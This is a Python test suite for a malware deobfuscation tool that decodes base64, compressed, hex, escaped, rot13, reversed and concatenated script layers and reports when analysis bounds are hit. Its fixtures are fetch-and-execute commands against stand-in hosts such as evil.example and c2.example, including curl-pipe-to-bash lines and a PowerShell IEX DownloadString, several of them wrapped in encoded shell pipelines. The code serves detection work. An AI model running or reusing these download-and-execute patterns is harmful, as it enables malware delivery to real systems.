import base64
import bz2
import codecs
import gzip
import zlib

from vigil import deobfuscator as d


def texts(root):
    return [layer.text for layer in d.flatten(root)]


def techniques(root):
    return [layer.technique for layer in d.flatten(root)]


# --- likeness() -------------------------------------------------------

def test_likeness_zero_for_plain_text():
    assert d.likeness("just a normal sentence about cats") == 0


def test_likeness_counts_family_once_regardless_of_repeats():
    single = d.likeness("curl http://evil.example/payload")
    repeated = d.likeness(" ".join(["curl http://evil.example/payload"] * 500))
    assert single == repeated
    assert single >= 1


def test_likeness_counts_distinct_families():
    text = "curl http://evil.example | powershell -encodedcommand foo; schtasks /create"
    # web_download, network_protocol, shell_indicators, obfuscation_flags, persistence
    assert d.likeness(text) >= 4


# --- benign input -------------------------------------------------------

def test_benign_script_produces_zero_children():
    source = "#!/bin/bash\necho 'hello world'\ndate\n"
    root = d.deobfuscate(source)
    assert root.depth == 0
    assert root.technique == "source"
    assert root.text == source
    assert root.children == []


# --- base64 ---------------------------------------------------------------

def test_base64_layer_with_keyword_is_kept():
    payload = "curl http://malicious.example/stage2.sh | bash"
    blob = base64.b64encode(payload.encode()).decode()
    source = f"echo {blob} | base64 -d | sh"
    root = d.deobfuscate(source)
    found = [t for t in texts(root) if t == payload]
    assert found, texts(root)


def test_nested_base64_two_layers_deep():
    payload = "curl http://c2.example/beacon"
    once = base64.b64encode(payload.encode()).decode()
    twice = base64.b64encode(once.encode()).decode()
    root = d.deobfuscate(twice)
    all_texts = texts(root)
    assert once in all_texts
    assert payload in all_texts
    # confirm actual depth ordering
    layer_by_text = {l.text: l for l in d.flatten(root)}
    assert layer_by_text[payload].depth > layer_by_text[once].depth


def test_jwt_like_base64_is_pruned_as_noise():
    # header/payload of a JWT: valid base64url, decodes to JSON, no
    # suspicious keywords, and is a dead end -> should be pruned.
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip("=")
    payload = base64.urlsafe_b64encode(b'{"sub":"1234567890","name":"John Doe"}').decode().rstrip("=")
    source = f"{header}.{payload}.somesignaturegoeshere"
    root = d.deobfuscate(source)
    assert root.children == []


def test_gzip_compressed_base64_payload():
    payload = "powershell -encodedcommand malicious"
    compressed = gzip.compress(payload.encode())
    blob = base64.b64encode(compressed).decode()
    root = d.deobfuscate(f"iex ({blob})")
    assert payload in texts(root)
    assert any(t.startswith("base64+gzip") for t in techniques(root))


def test_zlib_compressed_base64_payload():
    payload = "invoke-expression http://evil.example/dropper"
    compressed = zlib.compress(payload.encode())
    blob = base64.b64encode(compressed).decode()
    root = d.deobfuscate(blob)
    assert payload in texts(root)
    assert any(t.startswith("base64+zlib") for t in techniques(root))


def test_bz2_compressed_base64_payload():
    payload = "curl http://evil.example/dropper.sh"
    compressed = bz2.compress(payload.encode())
    blob = base64.b64encode(compressed).decode()
    root = d.deobfuscate(blob)
    assert payload in texts(root)
    assert any(t.startswith("base64+bz2") for t in techniques(root))


# --- PowerShell -EncodedCommand -------------------------------------------

def test_powershell_encoded_command_is_utf16le():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')"
    blob = base64.b64encode(payload.encode("utf-16-le")).decode()
    source = f"powershell.exe -EncodedCommand {blob}"
    root = d.deobfuscate(source)
    assert payload in texts(root)
    assert "powershell_encodedcommand" in techniques(root)


# --- hex --------------------------------------------------------------

def test_hex_layer_with_keyword_is_kept():
    payload = "wget http://evil.example/x.sh -O /tmp/x.sh"
    blob = payload.encode().hex()
    root = d.deobfuscate(f"echo {blob} | xxd -r -p | sh")
    assert payload in texts(root)


# --- \x and \u escapes --------------------------------------------------

def test_x_escape_layer():
    payload = "curl http://evil.example/a"
    blob = "".join(f"\\x{b:02x}" for b in payload.encode())
    root = d.deobfuscate(blob)
    assert payload in texts(root)
    assert "x_escape" in techniques(root)


def test_u_escape_layer():
    payload = "curl http://evil.example/b"
    blob = "".join(f"\\u{ord(c):04x}" for c in payload)
    root = d.deobfuscate(blob)
    assert payload in texts(root)
    assert "u_escape" in techniques(root)


# --- URL encoding -------------------------------------------------------

def test_url_encoding_layer():
    payload = "curl http://evil.example/c?x=1"
    from urllib.parse import quote
    blob = quote(payload, safe="")
    root = d.deobfuscate(blob)
    assert payload in texts(root)


# --- decimal char array --------------------------------------------------

def test_decimal_char_array_layer():
    payload = "curl http://evil.example/d"
    blob = "[" + ",".join(str(b) for b in payload.encode()) + "]"
    root = d.deobfuscate(blob)
    assert payload in texts(root)
    assert "decimal_char_array" in techniques(root)


# --- string concatenation -------------------------------------------------

def test_string_concat_layer():
    source = "iex ('curl ' + 'http://evil.example/e' + ' | bash')"
    root = d.deobfuscate(source)
    assert "curl http://evil.example/e | bash" in texts(root)
    assert "string_concat" in techniques(root)


# --- rot13 / reversed ------------------------------------------------------

def test_rot13_layer():
    payload = "curl http://evil.example/f"
    blob = codecs.encode(payload, "rot13")
    root = d.deobfuscate(blob)
    assert payload in texts(root)
    assert "rot13" in techniques(root)


def test_reversed_layer():
    payload = "curl http://evil.example/g"
    blob = payload[::-1]
    root = d.deobfuscate(blob)
    assert payload in texts(root)
    assert "reversed" in techniques(root)


# --- substring suppression -------------------------------------------------

def test_sibling_substring_suppression():
    # overlapping decodes: a whole-text reversal and a shorter substring
    # reversal of the same content should collapse to the longer one.
    payload = "curl http://evil.example/full-payload-marker"
    blob = payload[::-1]
    root = d.deobfuscate(blob)
    matches = [l for l in d.flatten(root) if l.text == payload]
    assert len(matches) == 1


# --- bounds: depth, layer count, blob size, cycles -------------------------

def test_depth_is_bounded():
    payload = "curl http://evil.example/deep"
    blob = payload
    for _ in range(15):  # far more than MAX_DEPTH
        blob = base64.b64encode(blob.encode()).decode()
    root = d.deobfuscate(blob)
    depths = [l.depth for l in d.flatten(root)]
    assert max(depths) <= d.MAX_DEPTH


def test_layer_count_is_bounded():
    # many independent, distinct base64 blobs so each produces its own layer
    parts = []
    for i in range(400):
        payload = f"curl http://evil.example/{i}-distinct-marker-value"
        parts.append(base64.b64encode(payload.encode()).decode())
    source = " ".join(parts)
    root = d.deobfuscate(source)
    assert len(d.flatten(root)) <= d.MAX_LAYERS


def test_oversized_child_blob_is_skipped():
    huge_payload = "curl http://evil.example/ " + ("A" * (d.MAX_BLOB_SIZE + 1))
    blob = base64.b64encode(huge_payload.encode()).decode()
    root = d.deobfuscate(blob)
    assert huge_payload not in texts(root)
    assert root.children == []


def test_reversal_cycle_does_not_loop_forever():
    # reversing twice returns to the original text; cycle detection via
    # global content-hash dedup must stop this from recursing forever.
    source = "short text with curl http://evil.example/h in it"
    root = d.deobfuscate(source)  # must simply terminate
    assert root.text == source


def test_random_noise_does_not_crash_and_is_not_kept():
    import random
    random.seed(1234)
    noise = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") for _ in range(64))
    root = d.deobfuscate(noise)  # must not raise
    assert isinstance(root.children, list)


def test_malformed_input_various_hostile_strings_do_not_crash():
    hostile_inputs = [
        "",
        "=" * 50,
        "%%%%%%%%%%",
        "\\x\\x\\x\\x",
        "\\u\\u\\u\\u",
        "[" + ",".join(["999"] * 10) + "]",  # out-of-range decimal array
        "'" + "unterminated string",
        "A" * 5000,
        "0x" + "g" * 20,  # invalid hex despite prefix
    ]
    for source in hostile_inputs:
        root = d.deobfuscate(source)
        assert root.text == source


# --- flatten() -------------------------------------------------------------

def test_flatten_includes_root_and_all_descendants():
    payload = "curl http://evil.example/i"
    once = base64.b64encode(payload.encode()).decode()
    twice = base64.b64encode(once.encode()).decode()
    root = d.deobfuscate(twice)
    flat = d.flatten(root)
    assert flat[0] is root
    assert len(flat) == len(set(id(l) for l in flat))  # no duplicate objects
    all_ids = {l.id for l in flat}
    for layer in flat:
        if layer.parent_id is not None:
            assert layer.parent_id in all_ids


# --- incomplete-analysis reporting -----------------------------------------
# A bound that silently truncates analysis is a false-negative generator: a
# payload buried below the depth cap must never yield a clean, quiet report.

def test_depth_bound_is_reported_not_silent():
    payload = "curl http://evil.example/deep | sh"
    blob = payload
    for _ in range(14):                      # far below MAX_DEPTH reach
        blob = base64.b64encode(blob.encode()).decode()
    root = d.deobfuscate(blob)
    assert "max_depth" in root.bounds_hit
    assert any(l.truncated for l in d.flatten(root))


def test_truncated_layers_survive_pruning():
    """Without this, a keyword-free chain is pruned away and the evidence that
    analysis stopped short disappears with it."""
    blob = "curl http://evil.example/deep | sh"
    for _ in range(14):
        blob = base64.b64encode(blob.encode()).decode()
    root = d.deobfuscate(blob)
    assert len(d.flatten(root)) > 1, "truncated chain was pruned away"


def test_no_bounds_reported_for_ordinary_files():
    assert d.deobfuscate("#!/bin/bash\necho hello\n").bounds_hit == []
    shallow = base64.b64encode(b"curl http://evil.example/x | sh").decode()
    assert d.deobfuscate(shallow).bounds_hit == []


def test_truncated_flag_is_false_on_normal_layers():
    shallow = base64.b64encode(b"curl http://evil.example/x | sh").decode()
    assert not any(l.truncated for l in d.flatten(d.deobfuscate(shallow)))
